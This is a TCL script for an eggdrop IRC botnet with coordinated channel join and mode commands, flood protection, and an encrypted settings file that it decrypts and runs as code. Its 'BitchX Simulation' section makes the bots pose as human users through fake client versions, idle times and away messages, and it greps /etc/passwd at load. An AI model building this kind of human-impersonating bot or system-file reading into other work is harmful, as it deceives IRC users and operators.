####################################################################################
##                             Main TCL (eggdrop v1.1.7+)                         ##
##                                   Author - [T3]                                ##
##                                      xx/xx/xx                                  ##
####################################################################################

####################################################################################
##                              Backwards Compatibility                           ##
####################################################################################

set procedures {
   dumpserv dumphelp dbopen delnotes botcontrol fork forksource udp
   uid isauth gethost host2ip idx2ip idx2host encryptpass chanoplist
}

foreach proc $procedures {
   if {[info commands $proc] == $proc} { continue }
   switch -- $proc {
      dumpserv { proc dumpserv { args } { if {$args != ""} { putserv "[lindex $args 0]" } } }
      dumphelp { proc dumphelp { args } { if {$args != ""} { puthelp "[lindex $args 0]" } } }
      dbopen { proc dbopen { objectName fileName type flags option value } {} }
      delnotes { proc delnotes { handle args } {} }
      botcontrol { proc botcontrol { idx handle } {} }
      fork { proc fork {} {} }
      forksource { proc forksource {} {} }
      udp { proc udp { address port data } {} }
      uid { proc uid {} { return [exec whoami] } }
      isauth { proc isauth { idx } { return 0 } }
      gethost { proc gethost { address } { return $address } }
      host2ip { proc host2ip { address } { return $address } }
      idx2ip { proc idx2ip { idx } { return "" } }
      idx2host {
         proc idx2host { idx } {
            foreach 1user [dcclist] {
               if {[lindex $1user 0] != $idx} { continue }
               return [string tolower [lindex $1user 2]]
            }
            return ""
         }
      }
      encryptpass {
         proc encryptpass { string } {
            if {$string != ""} { return "+[encrypt $string password]" } else { return "" }
         }
      }
      chanoplist {
         proc chanoplist { channel args } {
            set oplist {}
            set flags [lindex $args 0]
            foreach user [chanlist $channel] {
               if {[isop $user $channel] && [matchattr [nick2hand $user $channel] $flags]} {
                  lappend oplist $user
               }
            }
            return $oplist
         }
      }
   }
}


####################################################################################
##                                 Utility Functions                              ##
####################################################################################

set flag1 A         ;# Access flag
set flag2 C         ;# Special bot
set flag3 g         ;# User is allowed to set bans (for non +o)
set flag4 Q         ;# Quiet mode (talking is prohibited)
set flag5 S         ;# Alternate service bot (for non +W)
set flag6 H         ;# Hub bot (+h/+a)
set flag7 L         ;# Limbo bot
set flag8 T         ;# Service bot/Multi-Transfer User
set flag9 W         ;# Service bot user
set flag0 v         ;# Auto-voiced user (+0 if channel-specific)

proc sindex { string index } { return [lindex [split [string trim $string] " "] $index] }

proc srange { string start end } { return [join [lrange [split [string trim $string] " "] $start $end]] }

proc strcmp { string1 string2 } {
   if {[string tolower $string1] == [string tolower $string2]} { return 1 } else { return 0 }
}

proc str2tcl { args } {
   set args [lindex $args 0]
   regsub -all {\\} $args {\\\\} tcl
   regsub -all {\[} $tcl {\\[} tcl
   regsub -all {\]} $tcl {\\]} tcl
   regsub -all {\{} $tcl {\{} tcl
   regsub -all {\}} $tcl {\}} tcl
   return $tcl
}

proc kill_timer { args } {
   set timerID [lindex $args 0]
   set killed 0
   foreach 1timer [timers] {
      if {[lindex $1timer 1] != $timerID} { continue }
      killtimer [lindex $1timer 2]
      set killed 1
   }
   return $killed
}

proc kill_utimer { args } {
   set timerID [lindex $args 0]
   set killed 0
   foreach 1utimer [utimers] {
      if {[lindex $1utimer 1] != $timerID} { continue }
      killutimer [lindex $1utimer 2]
      set killed 1
   }
   return $killed
}

proc settimer { minutes command } {
   if {$minutes < 1} { set minutes 1 }
   kill_timer "$command"
   timer $minutes "$command"
}

proc setutimer { seconds command } {
   if {$seconds < 1} { set seconds 1 }
   kill_utimer "$command"
   utimer $seconds "$command"
}

proc isnum { number } { return [regexp ^(-|\[0-9\]*)\[0-9\]+$ $number] }

proc isip { address } {
   set IP [split $address .]
   if {[llength $IP] != 4} { return 0 }
   if {[lindex $IP 0] < 256 && [lindex $IP 0] > -1 && [lindex $IP 1] < 256 && [lindex $IP 1] > -1 &&
       [lindex $IP 2] < 256 && [lindex $IP 2] > -1 && [lindex $IP 3] < 256 && [lindex $IP 3] > -1} {
      return 1
   }
   return 0
}

proc fixhost { hostname args } {
   set channel [lindex $args 0]
   if {![regexp \[^*!@\] $hostname]} { return "" }
   set nick [lindex [split $hostname !] 0]
   set ident [lindex [split [lindex [split $hostname !] 1] @] 0]
   set host [lindex [split $hostname @] 1]
   if {[string length $nick] > 9} { set nick [string range $nick 0 7]\* }
   if {[string length $ident] > 10} { set ident \*[string range $ident [expr [string length $ident]-9] end] }
   set hostmask "$nick!$ident@$host"
   if {[validchan $channel]} {
      if {![regexp \[^!\]!\\* $hostmask] && [string length $ident] < 10} { regsub "!" $hostmask "!\*" hostmask }
   } else { return $hostmask }
   if {![botisop $channel]} { return $hostmask }
   set lbans {} ; set lhost [string tolower $hostmask]
   foreach ban [string tolower [chanbans $channel]] {
      if {$lhost != $ban && [string match [str2tcl $lhost] $ban]} {
         lappend lbans $ban
         if {[isban $ban $channel] && [killchanban $channel $ban]} { continue }
         pushmode $channel -b $ban
      }
   }
   if {$lbans != {}} { putlog "\[\002FIX-CHANBAN\002\] Lifting 'matching' bans on $channel ($hostmask):  $lbans" }
   flushmode $channel
   return $hostmask
}

proc scramble { list } {
   set scrambled {}
   set unscrambled $list
   for {set i 0} {$i < [llength $list]} {incr i} {
      set r [rand [llength $unscrambled]]
      lappend scrambled [lindex $unscrambled $r]
      set unscrambled [lreplace $unscrambled $r $r]
   }
   return $scrambled
}

proc randstring { length } {
   set rs ""
   for {set j 0} {$j < $length} {incr j} {
      set x [rand 73]
      append rs [string range "1234567890!@#$%^&*()_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" $x $x]
   }
   return $rs
}

proc keycheck { idx inputkey realkey command } {
   if {$inputkey != "" && [encryptpass $inputkey] == $realkey} { return 1 }
   putlog "Incorrect $command command key"
   putdcc $idx "\[\002WARNING\002\] You will lose all your flags on the next failed attempt."
   return 0
}

proc validop { handle args } {
   if {![validuser $handle] || [matchattr $handle d] || [matchattr $handle k]} { return 0 }
   set channel [lindex $args 0]
   if {[validchan $channel]} {
      if {![matchattr $handle o] && ![matchchanattr $handle o $channel]} { return 0 }
      if {[matchchanattr $handle d $channel] || [matchchanattr $handle k $channel]} { return 0 }
   } elseif {![matchattr $handle o]} { return 0 }
   return 1
}

proc noflag { idx } {
   global nick
   putdcc $idx "\[\002ERROR\002\]"
   putdcc $idx "For security reasons this command is only available on +T bots."
   putdcc $idx " - If you would like to use that command on this bot, then you will"
   putdcc $idx "   need to '.chattr $nick +T' on this bot and all the rest."
   putdcc $idx " "
}

proc announce { args } {
   putloglev 2 * "[lindex $args 0]"
   dccbroadcast "[lindex $args 0]"
}

proc show { bot command args } {
   set args [lindex $args 0] ; set idx [sindex $args 0]
   if {[valididx $idx]} { putdcc $idx [srange $args 1 end] }
}
bind bot - show show

proc allflags {} { return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" }

proc cryptsource { key file } {
   global nick tclsfile lbthresh hbthresh autokick minbots allowprocs noOp dontOp counters clientport
   global prefservers tclKey autovoice curmotd splitdetect bgpcheck chopcount mainchan noprot
   global hidetimer onlypref badhosts deoptype servers realservers proxybot proxypass forkbot tclsource
   global repeat_chan_times repeat_cycle repeat_msg repeat_is_active
   if {![file isfile $file]} {
      putloglev 2 * "\[\002ERROR\002\] Could not source '$file'; file does not exist." ; return
   }
   if {[catch {set f [open $file r]} open_error] != 0} {
      putloglev 2 * "\[\002ERROR\002\] Could not open '$file' for reading:  $open_error" ; return
   }
   set fcounter 0
   if {![info exists key] || $key == ""} { return }
   while {![eof $f]} {
      gets $f line
      set text [decrypt $key $line $fcounter]
      if {$fcounter == 0 && $file == $tclsfile} {
         set tclsource ""
         if {$text != "" && $text != $nick} {
            announce "\[\002WARNING\002\] Invalid TCL settings file:  check for tampering"
            catch {close $f}
            return
         }
      } else { catch $text }
      incr fcounter
   }
   catch {close $f}
}

proc save_settings {} {
   global nick tclsfile lbthresh hbthresh autokick minbots allowprocs noOp dontOp clientport
   global prefservers tclKey autovoice curmotd splitdetect bgpcheck chopcount mainchan counters noprot
   global hidetimer onlypref badhosts deoptype servers proxybot proxypass forkbot tclsource
   global repeat_chan_times repeat_cycle repeat_msg repeat_is_active
   if {![info exists tclsource]} { setutimer 2 save_settings ; return 0 }
   if {[catch {set sfile [open ".$nick.stmp" w 0600]} open_error] != 0} {
      putloglev 2 * "\[\002ERROR\002\] Could not open file to save TCL settings:  $open_error"
      return 0
   }
   set success 1
   set fcounter 0
   if {[catch {
      puts $sfile [encrypt $tclKey $nick $fcounter] ; incr fcounter
      foreach 1chan [string tolower [channels]] {
         if {![info exists lbthresh($1chan)]} { thresh - - $1chan }
         puts $sfile [encrypt $tclKey "set lbthresh([str2tcl $1chan]) $lbthresh($1chan)" $fcounter] ; incr fcounter
         puts $sfile [encrypt $tclKey "set hbthresh([str2tcl $1chan]) $hbthresh($1chan)" $fcounter] ; incr fcounter
      }
      if {[info exists noprot]} { puts $sfile [encrypt $tclKey "set noprot 1" $fcounter] ; incr fcounter }
      if {![info exists autokick]} { set autokick {} }
      puts $sfile [encrypt $tclKey "set autokick {[str2tcl [string tolower $autokick]]}" $fcounter] ; incr fcounter
      if {![info exists minbots]} { set minbots 5 }
      puts $sfile [encrypt $tclKey "set minbots $minbots" $fcounter] ; incr fcounter
      if {![info exists allowprocs($nick)]} { lappend allowprocs($nick) ./eggdrop eggdrop ps }
      puts $sfile [encrypt $tclKey "set allowprocs([str2tcl $nick]) {$allowprocs($nick)}" $fcounter] ; incr fcounter
      if {![info exists prefservers]} { set prefservers {} }
      puts $sfile [encrypt $tclKey "set prefservers {$prefservers}" $fcounter] ; incr fcounter
      if {![info exists autovoice]} { set autovoice {} }
      puts $sfile [encrypt $tclKey "set autovoice {$autovoice}" $fcounter] ; incr fcounter
      if {![info exists curmotd]} { set curmotd "" }
      puts $sfile [encrypt $tclKey "set curmotd {$curmotd}" $fcounter] ; incr fcounter
      if {![info exists bgpcheck]} { set bgpcheck 1 }
      puts $sfile [encrypt $tclKey "set bgpcheck $bgpcheck" $fcounter] ; incr fcounter
      if {![info exists forkbot]} { set forkbot 1 }
      puts $sfile [encrypt $tclKey "set forkbot $forkbot" $fcounter] ; incr fcounter
      if {![info exists chopcount]} { set chopcount 1 }
      puts $sfile [encrypt $tclKey "set chopcount $chopcount" $fcounter] ; incr fcounter
      if {![info exists noOp]} { set noOp 1 }
      puts $sfile [encrypt $tclKey "set noOp $noOp" $fcounter] ; incr fcounter
      if {![info exists deoptype]} { set deoptype 0 }
      puts $sfile [encrypt $tclKey "set deoptype $deoptype" $fcounter] ; incr fcounter
      if {![info exists mainchan]} { set mainchan "" }
      puts $sfile [encrypt $tclKey "set mainchan [str2tcl $mainchan]" $fcounter] ; incr fcounter
      if {![info exists badhosts]} { set badhosts {} }
      puts $sfile [encrypt $tclKey "set badhosts {$badhosts}" $fcounter] ; incr fcounter
      if {[info exists splitdetect]} { puts $sfile [encrypt $tclKey "set splitdetect 1" $fcounter] ; incr fcounter }
      if {[info exists onlypref]} { puts $sfile [encrypt $tclKey "set onlypref 1" $fcounter] ; incr fcounter }
      foreach 1bot [string tolower [userlist bo]] {
         if {![info exists counters($1bot)]} { set counters($1bot) [encrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] 0] }
         puts $sfile [encrypt $tclKey "set counters($1bot) $counters($1bot)" $fcounter] ; incr fcounter
      }
      foreach 1badop [array names dontOp] {
         puts $sfile [encrypt $tclKey "set dontOp([str2tcl $1badop]) [str2tcl $dontOp($1badop)]" $fcounter] ; incr fcounter
      }
      foreach 1user [userlist pS] {
         if {![info exists hidetimer($1user)]} { set hidetimer($1user) 10 }
         puts $sfile [encrypt $tclKey "set hidetimer([str2tcl $1user]) $hidetimer($1user)" $fcounter] ; incr fcounter
      }
      foreach bncport [array names clientport] {
         puts $sfile [encrypt $tclKey "set clientport($bncport) $clientport($bncport)" $fcounter] ; incr fcounter
      }
      if {[info exists proxybot]} {
         if {![info exists servers]} { set servers {} }
         puts $sfile [encrypt $tclKey "set servers {$servers}" $fcounter] ; incr fcounter
         foreach 1proxypass [array names proxypass] {
            puts $sfile [encrypt $tclKey "set proxypass($1proxypass) $proxypass($1proxypass)" $fcounter] ; incr fcounter
         }
      }
      # Begin - ToR911 REPEAT KICK SETTINGS
      if {![info exists repeat_chan_times(GLOBAL)]} { set repeat_chan_times(GLOBAL) "2" }
      foreach 1arepeat [array names repeat_chan_times] {
         puts $sfile [encrypt $tclKey "set repeat_chan_times($1arepeat) \"$repeat_chan_times($1arepeat)\"" $fcounter] ; incr fcounter		
      }
      if {![info exists repeat_msg(GLOBAL)]} { set repeat_msg(GLOBAL) "Set repeat timers to 5mins" }
      foreach 1arepeat [array names repeat_msg] {
         puts $sfile [encrypt $tclKey "set repeat_msg($1arepeat) \"$repeat_msg($1arepeat)\"" $fcounter] ; incr fcounter
      }
      if {![info exists repeat_cycle]} { set repeat_cycle "4" }
      puts $sfile [encrypt $tclKey "set repeat_cycle \"$repeat_cycle\"" $fcounter] ; incr fcounter
      if {![info exists repeat_is_active]} { set repeat_is_active "0" }
      puts $sfile [encrypt $tclKey "set repeat_is_active \"$repeat_is_active\"" $fcounter] ; incr fcounter
      # End - ToR911 REPEAT KICK SETTINGS
   } write_error] != 0} {
      set success 0
      putloglev 2 * "\[\002ERROR\002\] Could not write TCL settings to file:  $write_error"
   }
   if {[catch {close $sfile} close_error] != 0} {
      set success 0
      putloglev 2 * "\[\002ERROR\002\] Error closing TCL settings file:  $close_error"
   }
   if {[catch {exec mv ".$nick.stmp" $tclsfile} error] != 0} {
      set success 0
      putloglev 2 * "\[\002ERROR\002\] Could not move TCL settings from temp file:  $error"
   }
   return $success
}


####################################################################################
##                [T3] CTCP Flood Protection && BitchX Simulation                 ##
####################################################################################

proc flud_filter { nick host handle type channel } {
   if {$type != "msg"} { return 1 } else { return 0 }
}
bind flud - * flud_filter

switch [rand 9] {
   0 { set bxVersion "BitchX-75p1+" }
   1 { set bxVersion "BitchX-75p2-9" }
   2 { set bxVersion "BitchX-75p2-9+" }
   3 { set bxVersion "BitchX-75+Tcl1.5" }
   4 { set bxVersion "BitchX-75a11+" }
   5 { set bxVersion "BitchX-75p2-9+Tcl1.6" }
   6 { set bxVersion "BitchX-75p1+Tcl1.5" }
   7 { set bxVersion "BitchX-75p2-10+" }
   8 { set bxVersion "BitchX-75p2-10+Tcl1.6" }
}

switch [rand 9] {
   0 { set system "Linux 2.0.33" }
   1 { set system "Linux 2.0.34" }
   2 { set system "Linux 2.0.35" }
   3 { set system "Linux 2.0.36" }
   4 { set system "BSD/OS 3.1" }
   5 { set system "BSD/OS 4.0" }
   6 { set system "SunOS 5.7" }
   7 { set system "FreeBSD 2.2.2-RELEASE" }
   8 { set system "FreeBSD 2.2.5-RELEASE" }
}

set clientinfo(sed) "SED contains simple_encrypted_data"
set clientinfo(version) "VERSION shows client type, version and environment"
set clientinfo(clientinfo) "CLIENTINFO gives information about available CTCP commands"
set clientinfo(userinfo) "USERINFO returns user settable information"
set clientinfo(errmsg) "ERRMSG returns error messages"
set clientinfo(finger) "FINGER shows real name, login name and idle time of user"
set clientinfo(time) "TIME tells you the time on the user's host"
set clientinfo(action) "ACTION contains action descriptions for atmosphere"
set clientinfo(dcc) "DCC requests a direct_client_connection"
set clientinfo(cdcc) "CDCC checks cdcc info for you"
set clientinfo(bdcc) "BDCC checks cdcc info for you"
set clientinfo(xdcc) "XDCC checks cdcc info for you"
set clientinfo(utc) "UTC substitutes the local timezone"
set clientinfo(ping) "PING returns the arguments it receives"
set clientinfo(invite) "INVITE invite to channel specified"
set clientinfo(whoami) "WHOAMI user list information"
set clientinfo(echo) "ECHO returns the arguments it receives"
set clientinfo(ops) "OPS ops the person if on userlist"
set clientinfo(op) "OP ops the person if on userlist"
set clientinfo(unban) "UNBAN unbans the person from channel"
set clientinfo(ident) "IDENT change userhost of userlist"
set clientinfo(xlink) "XLINK x-filez rule"
set clientinfo(uptime) "UPTIME my uptime"

if {[catch {set userid [uid]}] != 0} {
   if {[info exists username]} { set userid $username } else { set userid "userid" }
}
if {[catch {set uname [exec uname -srm]}] != 0} { set uname "N/A" }
if {[catch {set fingerhost [exec uname -n]}] != 0} { set fingerhost "" }
if {[catch {set homedir [lindex [split [exec grep -w $userid /etc/passwd] :] 5]}] != 0} { set homedir "" }

proc ctcp_request { unick host handle dest keyword args } {
   global nick botnick botname clientinfo bxVersion system fingerhost fingeridle max-ctcp numctcp ignorectcp
   if {[info exists ignorectcp] || [matchattr $handle b]} { return 1 }
   if {![info exists numctcp]} { set numctcp 0 }
   incr numctcp
   kill_utimer "catch {unset numctcp}"
   if {$numctcp > ${max-ctcp}} {
      set ignorectcp ""
      unset numctcp
      setutimer 60 "catch {unset ignorectcp}"
      putlog "\[\002ALERT\002\] CTCP flood detected, ignoring all ctcp for 1 minute."
      if {([string index $dest 0] == "#" || [string index $dest 0] == "&") && [botisop $dest] && [onchan $unick $dest]} {
         putserv "KICK $dest $unick :\002CTCP\002 flooder"
      }
      return 1
   }
   utimer 60 "catch {unset numctcp}"
   set args [string tolower [lindex $args 0]]
   set keyword [string tolower $keyword]
   if {$keyword == "clientinfo"} {
      if {$args == ""} {
         putlog "\[\002CTCP\002\] CLIENTINFO request from \002$unick\002  ($host)"
         puthelp "NOTICE $unick :\001CLIENTINFO SED UTC ACTION DCC CDCC BDCC XDCC VERSION CLIENTINFO USERINFO ERRMSG FINGER TIME PING ECHO INVITE WHOAMI OP OPS UNBAN IDENT XLINK UPTIME  :Use CLIENTINFO <COMMAND> to get more specific information\001"
         return 1
      } elseif {[info exists clientinfo($args)]} {
         putlog "\[\002CTCP\002\] CLIENTINFO: Help on \037$args\037 requested by \002$unick\002  ($host)"
         puthelp "NOTICE $unick :\001CLIENTINFO $clientinfo($args)\001"
         return 1
      }
      putlog "\[\002CTCP\002\] CLIENTINFO: Help on UNKNOWN command ($args) requested by \002$unick\002  ($host)"
      puthelp "NOTICE $unick :\001ERRMSG CLIENTINFO: $args is not a valid function\001"
      return 1
   } elseif {$keyword == "version"} {
      putlog "\[\002CTCP\002\] VERSION request from \002$unick\002  ($host)"
      puthelp "NOTICE $unick :\001VERSION $bxVersion by panasync - $system : Keep it to yourself!\001"
      return 1
   } elseif {$keyword == "ping"} {
      putlog "\[\002CTCP\002\] PING request from \002$unick\002  ($host)"
      puthelp "NOTICE $unick :\001PING $args\001"
      return 1
   } elseif {$keyword == "userinfo"} {
      putlog "\[\002CTCP\002\] USERINFO request from \002$unick\002  ($host)"
      puthelp "NOTICE $unick :\001USERINFO\001"
      return 1
   } elseif {$keyword == "finger"} {
      putlog "\[\002CTCP\002\] FINGER request from \002$unick\002  ($host)"
      if {(![info exists fingeridle]) || $fingeridle > 600} { set fingeridle 2 }
      if {[info exists fingeridle]} { set fingeridle [expr $fingeridle + [rand 5]] }
      if {$fingerhost == ""} { set fingerhost [lindex [split [lindex [split $botname @] 1] .] 0] }
      set fingerIdent [lindex [split [lindex [split $botname @] 0] !] 1]
      puthelp "NOTICE $unick :\001FINGER $fingerIdent ($fingerIdent@$fingerhost) Idle $fingeridle seconds\001"
      return 1
   } elseif {$keyword == "time"} {
      putlog "\[\002CTCP\002\] TIME request from \002$unick\002  ($host)"
      puthelp "NOTICE $unick :\001TIME [ctime [unixtime]]\001"
      return 1
   }
   if {[strcmp $dest $botnick]} {
      if {$keyword == "echo"} {
         putlog "\[\002CTCP\002\] ECHO request from \002$unick\002  ($host)"
         puthelp "NOTICE $unick :\001ECHO [string range $args 0 59]\001"
         return 1
      } elseif {$keyword == "errmsg"} {
         putlog "\[\002CTCP\002\] ERRMSG request from \002$unick\002  ($host)"
         puthelp "NOTICE $unick :\001ERRMSG [string range $args 0 59]\001"
         return 1
      } elseif {$keyword == "chat"} {
         putlog "\[\002CTCP\002\] CHAT request from \002$unick\002  ($host)"
         dccbroadcast "\002CTCP CHAT\002 request from $unick!$host (handle: $handle)"
         if {![matchattr $nick H] && [bots] != ""} { return 1 }
         return 0
      } elseif {$keyword == "ops" || $keyword == "op" || $keyword == "invite" || $keyword == "unban" || $keyword == "whoami"} {
         putlog "\[\002CTCP\002\] [string toupper $keyword] request from \002$unick\002  ($host)"
         if {$args == "" && $keyword != "whoami"} { return 1 }
         if {($keyword == "ops" || $keyword == "op") && (![validchan [sindex $args 0]] || ![botisop [sindex $args 0]])} {
            puthelp "NOTICE $unick :BitchX: I'm not on $args, or I'm not opped"
            return 1
         } elseif {($keyword == "invite" || $keyword == "unban") && (![validchan [sindex $args 0]] || ![onchan $botnick [sindex $args 0]])} {
            if {$keyword == "invite" && [string index [sindex $args 0] 0] != "#"} { return 1 }
            puthelp "NOTICE $unick :BitchX: I'm not on that channel"
            return 1
         }
         puthelp "NOTICE $unick :BitchX: Access Denied"
         return 1
      } elseif {$keyword == "utc"} {
         putlog "\[\002CTCP\002\] UTC request from \002$unick\002  ($host)"
         # if {$args != ""} { puthelp "NOTICE $unick :Wed Dec 31 19:00:01 1969" }
         return 1
      }
   }
   putlog "\[\002CTCP\002\] [string toupper $keyword] request from \002$unick\002  ($host)"
   return 1
}
bind ctcp - CLIENTINFO ctcp_request
bind ctcp - VERSION ctcp_request
bind ctcp - PING ctcp_request
bind ctcp - USERINFO ctcp_request
bind ctcp - FINGER ctcp_request
bind ctcp - TIME ctcp_request
bind ctcp - ECHO ctcp_request
bind ctcp - ERRMSG ctcp_request
bind ctcp - UTC ctcp_request
bind ctcp - OPS ctcp_request
bind ctcp - OP ctcp_request
bind ctcp - INVITE ctcp_request
bind ctcp - UNBAN ctcp_request
bind ctcp - WHOAMI ctcp_request
bind ctcp - CHAT ctcp_request

proc dcc_request { unick host handle dest keyword args } {
   global botnick numdcc max-dcc ignoredcc
   if {[matchattr $handle boT]} { return 0 }
   if {[info exists ignoredcc] || ![strcmp $dest $botnick]} { return 1 }
   if {[strcmp [sindex [lindex $args 0] 0] chat] && [strcmp $dest $botnick]} {
      announce "\002DCC CHAT\002 request from $unick!$host (handle: $handle)"
   }
   if {![info exists numdcc]} { set numdcc 0 }
   incr numdcc
   kill_utimer "catch {unset numdcc}"
   if {$numdcc > ${max-dcc}} {
      set ignoredcc ""
      unset numdcc
      setutimer 60 "catch {unset ignoredcc}"
      putlog "\[\002ALERT\002\] DCC flood detected, ignoring all DCC Chat/Send for 1 minute."
      return 1
   }
   utimer 60 "catch {unset numdcc}"
}
bind ctcp - DCC dcc_request
bind ctcp - RESUME dcc_request

set awaymsgs { 
   {sleep} {work} {fewd} {coding} {watching tv} {movies#$%} {bathroom} {gone} {out} {leave me alone} {bathroom}
   {Zzzzzzz} {Auto-Away after 10 mins} {l8r whores} {idle} {TV} {outside..brb} {movies} {Diablo}
   {DOOM} {Warcraft} {shower} {having sex} {dishes :\ } {laundry} {school sucks!!} {Telephone Other-line} {fixing my car}
   {cereal break} {Warcraft} {will be back shortly} {Auto-Away after 15 mins} {Auto-Away after 30 mins} {out for a bit}
   {err leave me alone} {c0ding} {making a webpage} {leave me alone} {cigarette break} {bleh ...} {homework} {BASKETBALL}
   {stupid homework} {ERRRRRRRR!!!!!}
}

proc set_away {} {
   global awaymsgs
   if {![info exists awaymsgs] || $awaymsgs == ""} { set awaymsgs "Auto-Away after 10 mins" }
   if {[rand 4] == 1} {
      if {[rand 10] == 1} { set OnOff "Off" } else { set OnOff "On" }
      putserv "AWAY :is away: ([lindex $awaymsgs [rand [llength $awaymsgs]]]) \[BX-MsgLog $OnOff\]"
   } else { putserv "AWAY :" }
   setutimer [expr [rand 600]+1] set_away
}

####################################################################################
####################################################################################



####################################################################################
##                                   [T3] Net Tools                               ##
####################################################################################

###########################################
##       Channel-specific settings

proc channel_settings { handle idx args } {
   global nick
   set args [lindex $args 0]
   set channel [sindex $args 0] ; set settings [srange $args 1 end]
   putcmdlog "#$handle# netset $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$settings == ""} { putdcc $idx "\002Usage:\002 .netset <channel> <setting1> \[setting2\] ..." ; return }
   if {[validchan $channel]} {
      foreach 1setting [split $settings] { channel set $channel $1setting }
      catch {savechannels}
   }
   putallbots "chanset $handle $channel $settings"
   putdcc $idx "*** Changing channel settings for \002$channel\002 to '$settings' on all bots ..."
}
bind dcc n netset channel_settings
bind dcc n netchanset channel_settings

proc net_chanset { bot command args } {
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set channel [sindex $args 1] ; set settings [srange $args 2 end]
   if {![validchan $channel]} { return }
   foreach 1setting [split $settings] { channel set $channel $1setting }
   putlog "\[\002CHANSET\002\] Changed channel settings for \002$channel\002 to '$settings'."
   putlog " - Authorized by $handle@$bot"
   catch {savechannels}
}
bind bot - chanset net_chanset

proc channel_modes { handle idx args } {
   global nick
   set args [lindex $args 0]
   set channel [sindex $args 0] ; set setting [srange $args 1 end]
   putcmdlog "#$handle# netmode $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$setting == ""} { putdcc $idx "\002Usage:\002 .netmode <channel> <mode>" ; return }
   if {[string match "*-*" $setting] && ![string match "*-l*" $setting] && ![string match "*-k*" $setting]} {
      putdcc $idx "*** You may not enforce that kind of mode. (bot-war protection)" ; return
   }
   putallbots "chanmode $handle $channel $setting"
   putdcc $idx "*** Changing channel modes for \002$channel\002 to '$setting' on all bots ..."
   if {[validchan $channel]} {
      channel set $channel chanmode "$setting"
      catch {savechannels}
   }
}
bind dcc n netmode channel_modes
bind dcc n netchanmode channel_modes

proc net_chanmode { bot command args } {
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set channel [sindex $args 1] ; set setting [srange $args 2 end]
   if {![validchan $channel] || ([string match "*-*" $setting] && ![string match "*-l*" $setting] && ![string match "*-k*" $setting])} { return }
   putlog "\[\002CHANMODE\002\] Changed channel modes for \002$channel\002 to '$setting'."
   putlog " - Authorized by $handle@$bot"
   channel set $channel chanmode "$setting"
   catch {savechannels}
}
bind bot - chanmode net_chanmode


###########################################
##       Botnet Join/Part Commands

proc addchan { channel } {
   global botnick defmode limbo
   set channel [string tolower $channel]
   if {[string index $channel 0] != "#" && [string index $channel 0] != "&"} { return }
   channel add $channel
   if {![botisop $channel] && ![info exists limbo]} { thresh 0 0 $channel }
   dumphelp "JOIN $channel"
   channel set $channel +dynamicbans -enforcebans +stopnethack +bitch -greet -autoop -protectops -statuslog +shared
   channel set $channel chanmode "$defmode"
   setutimer 2 "catch {savechannels}"
}

proc join_channel { handle idx args } {
   global nick manOp
   set args [lindex $args 0]
   putcmdlog "#$handle# netjoin $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == "" || ([string index [sindex $args 0] 0] != "#" && [string index [sindex $args 0] 0] != "&")} {
      putdcc $idx "\002Usage:\002 .netjoin <channel1> \[channel2\] ... \[: \[bots\]\]" ; return
   }
   if {![string match *:* $args]} {
      set channels $args
   } else {
      set channels [string trim [lindex [split $args :] 0]]
      set bots [string trim [lindex [split $args :] 1]]
   }
   if {![info exists bots]} {
      putdcc $idx "*** Joining all bots to '\002$channels\002' ..."
      putallbots "netjoin $handle $channels"
      foreach 1chan [split $channels] {
         addchan $1chan
         set manOp([string tolower *:$1chan]) 600
         setutimer 600 "catch {unset manOp([string tolower [str2tcl *:$1chan]])}"
      }
      putdcc $idx "*** You now have \00210\002 minutes to manually op on specified channel(s)."
   } else {
      foreach 1bot [split $bots] { catch {putbot $1bot "netjoin $handle $channels"} }
      putdcc $idx "*** Joining specified bots to '\002$channels\002' ..."
   }
}
bind dcc n netjoin join_channel

proc net_join { bot command args } {
   global manOp
   if {![matchattr $bot boT]} { return }
   set args [lindex $args 0]
   set handle [sindex $args 0] ; set channels [srange $args 1 end]
   putlog "\[\002NETJOIN\002\] Joining '\002$channels\002'"
   putlog " - Authorized by $handle@$bot"
   foreach 1chan [split $channels] {
      addchan $1chan
      set manOp([string tolower *:$1chan]) 600
      setutimer 600 "catch {unset manOp([string tolower [str2tcl *:$1chan]])}"
   }
}
bind bot - netjoin net_join

proc remote_join { handle idx args } {
   global nick
   set args [lindex $args 0]
   putcmdlog "#$handle# remoteJoin $args"
   if {![matchattr $nick boT]} { noflag $idx ; return }
   if {$args == "" || [string index [sindex $args 0] 0] == "#" ||
      ([string index [sindex $args 1] 0] != "#" && [string index [sindex $args 1] 0] != "&")} {
      putdcc $idx "\002Usage:\002 .remoteJoin \[bot\] <channel1> \[channel2\] ..." ; return
   }
   catch {putbot [sindex $args 0] "netjoin $handle [srange $args 1 end]"}
   putdcc $idx "*** Joining \002[sindex $args 0]\002 to '\002[srange $args 1 end]\002' ..."
}
bind dcc n remotejoin remote_join
bind dcc n rjoin remote_join

proc add_chan { idx arg } {
   if {![strcmp [sindex $arg 0] .join] && ![strcmp [sindex $arg 0] .+chan]} { return $arg }
   putcmdlog "#[idx2hand $idx]# [string range $arg 1 end]"
   set channel [sindex $arg 1]
   if {$channel == ""} { putdcc $idx "Usage: [string range [sindex $arg 0] 1 end] <#channel>" ; return }
   addchan $channel
   return
}
bind filt n ".join*" add_chan
bind filt n ".+chan*" add_chan

proc part_chan { idx arg } {
   global lbthresh hbthresh takeoplist
   if {![strcmp [sindex $arg 0] .part] && ![strcmp [sindex $arg 0] .-chan]} { return $arg }
   set handle [idx2hand $idx]
   if {![matchattr $handle nW]} {
      putloglev 2 * "#$handle# attempted [string range $arg 1 end]"
      putdcc $idx "What?  You need '.help'" ; return
   }
   putcmdlog "#$handle# [string range $arg 1 end]"
   set channel [string tolower [sindex $arg 1]]
   if {$channel == ""} { putdcc $idx "Usage: [string range [sindex $arg 0] 1 end] <#channel>" ; return }
   if {[validchan $channel]} {
      channel remove $channel
      dumphelp "PART $channel"
      catch {savechannels}
   }
   catch {unset lbthresh($channel)} ; catch {unset hbthresh($channel)} ; catch {unset takeoplist($channel)}
   no_autokick $channel
   save_settings
   return
}
